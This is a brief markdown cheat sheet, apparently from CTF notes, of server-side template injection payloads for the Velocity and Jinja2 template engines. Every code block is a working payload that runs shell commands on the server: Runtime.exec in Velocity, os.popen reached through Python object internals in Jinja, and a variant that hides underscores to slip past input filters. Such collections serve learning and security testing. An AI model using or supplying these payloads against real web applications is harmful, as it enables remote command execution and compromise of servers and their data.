#### Velocity template Langauge payload:

```
#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output
```

#### Jinja payload <i>(Python)</i> : 

```py
 #normal payload
 {{ ''.__class__.__base__.__subclasses__()[103].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}

 #payload without '_' and without '\' 
{% set c='%c%c'|format(95,95) %}  {{ dict.mro()[-1] | attr(c~'subclasses'~c)() | attr(c~'getitem'~c)(183) |attr(c~'init'~c) | attr(c~'globals'~c) | attr(c~'getitem'~c)('sys') | attr('modules') | attr(c~'getitem'~c)('os') | attr('popen')('cat flag*') | attr('read')() }}

 #not sure if it works but i found this.
 {{ url_for.__globals__.os.popen("ls").read() }}
 ```

![image](https://github.com/user-attachments/assets/d812c5f3-2f59-476a-a1e8-6a7ae978695a)

